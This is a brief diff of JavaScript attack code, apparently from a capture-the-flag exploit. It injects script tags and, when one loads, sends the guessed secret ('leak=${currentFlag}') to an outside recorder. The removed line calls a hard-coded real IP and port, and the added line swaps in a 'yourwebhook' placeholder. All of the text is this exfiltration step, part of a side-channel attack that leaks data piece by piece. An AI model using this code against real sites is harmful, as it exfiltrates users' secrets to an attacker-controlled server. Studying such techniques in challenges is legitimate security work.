@@ -271,7 +271,7 @@ async function checkError(currentFlag) {
     const script = document.createElement('script');
     script.src = url;
     script.onload = () => {
-      fetch(`http://52.221.194.237:64074/recorder.php?leak=${currentFlag}`)
+      fetch(`http://yourwebhook/recorder.php?leak=${currentFlag}`)
         .finally(() => resolve()); // 确保请求完成才继续
       flag = currentFlag;
     };
